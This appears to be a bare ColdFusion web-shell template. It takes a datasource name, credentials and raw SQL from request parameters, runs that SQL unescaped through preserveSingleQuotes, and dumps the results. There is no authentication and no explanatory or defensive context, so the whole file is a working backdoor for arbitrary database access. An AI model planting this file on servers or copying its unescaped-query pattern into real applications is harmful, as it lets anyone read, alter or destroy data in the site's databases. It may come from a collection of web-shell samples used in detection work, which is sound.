<cfif not ParameterExists(datasource)>
	<cfset datasource="">
	<cfset username="">
	<cfset password="">
	<cfset sql_cmds="">
 
<CFELSE>
<CFQuery Name="Q1" DataSource="#datasource#" username="#username#" password="#password#">
  #preserveSingleQuotes(sql_cmds)#
</CFQuery>
 
<cfdump var=#q1#>
 
</cfif>
